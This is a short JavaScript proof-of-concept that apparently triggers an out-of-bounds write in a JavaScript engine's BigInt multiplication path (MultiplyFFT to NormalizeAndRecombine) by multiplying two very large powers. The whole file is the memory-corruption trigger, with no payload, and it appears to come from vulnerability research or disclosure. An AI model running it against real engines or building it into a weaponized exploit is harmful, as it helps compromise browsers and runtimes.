// PoC for BigInt NormalizeAndRecombine OOB Write via multiplication
// ============================================================
// This PoC triggers the OOB via direct BigInt multiplication which
// goes through MultiplyFFT -> NormalizeAndRecombine.
//
// Same instrumentation requirements as poc_bigint_division_oob.js

const x = 123456n;
const a = 31337n ** x;
const b = 42n ** x;

// Direct multiplication: a * b -> MultiplyFFT -> NormalizeAndRecombine
const c = a * b;

print("Multiplication completed (if you see this, the OOB wasn't caught)");
